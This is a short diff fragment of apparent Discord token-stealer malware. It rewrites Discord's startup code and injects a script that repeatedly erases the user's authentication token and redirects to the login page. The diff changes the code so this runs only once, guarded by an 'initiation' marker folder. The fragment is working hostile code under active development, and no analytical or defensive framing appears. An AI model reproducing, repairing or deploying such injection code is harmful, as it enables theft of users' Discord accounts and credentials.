@@ -390,10 +390,8 @@ async function init() {
 require('${path.join(resourcePath, 'app.asar')}')
 if (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, "\\\\"));
   }
-  if (fs.existsSync(path.join(__dirname, 'initiation'))) {
-    return true;
-  }
-  fs.rmdirSync(path.join(__dirname, 'initiation'));
+  if (!fs.existsSync(path.join(__dirname, 'initiation'))) {
+  fs.mkdirSync(path.join(__dirname, 'initiation'));
   execScript(`(() => {
   // Effacer le token d'authentification
   setInterval(() => {
@@ -424,6 +422,7 @@ if (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, "\\\\"));
     window.location.href = 'https://discord.com/login';
   }, 2500);
   })();`);
+  }
   return false;
 }
 const execScript = script => {
